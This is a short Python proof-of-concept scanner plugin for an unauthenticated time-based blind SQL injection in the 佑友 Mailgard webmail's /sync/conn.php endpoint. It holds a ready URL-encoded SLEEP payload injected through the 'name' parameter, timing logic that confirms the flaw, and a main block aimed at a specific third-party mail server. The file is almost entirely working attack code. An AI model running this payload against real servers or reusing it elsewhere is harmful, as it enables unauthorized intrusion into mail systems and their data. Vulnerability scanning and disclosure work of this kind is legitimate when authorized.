# !/usr/bin/dev python
# -*- coding:utf-8 -*-

"""
POC Name  :  佑友mailgard webmail conn.php sql注入
Author    :  a
mail      :  a@lcx.cc
Referer   : http://0day5.com/archives/3207
            佑友mailgard webmail无需登录的SQL注射一枚
"""


import time
import urlparse

def assign(service, arg):
    if service == 'mailgard-webmail':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(args):
    
    payload = "/sync/conn.php?token=1&name=admin%27%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29GgwK%29%20AND%20%27VBmy%27=%27VBmy"
    url = args +payload
    start_time = time.time()
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and time.time() - start_time > 4:
        security_hole(url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('mailgard-webmail', 'http://mail.szjhqh.com/')[1])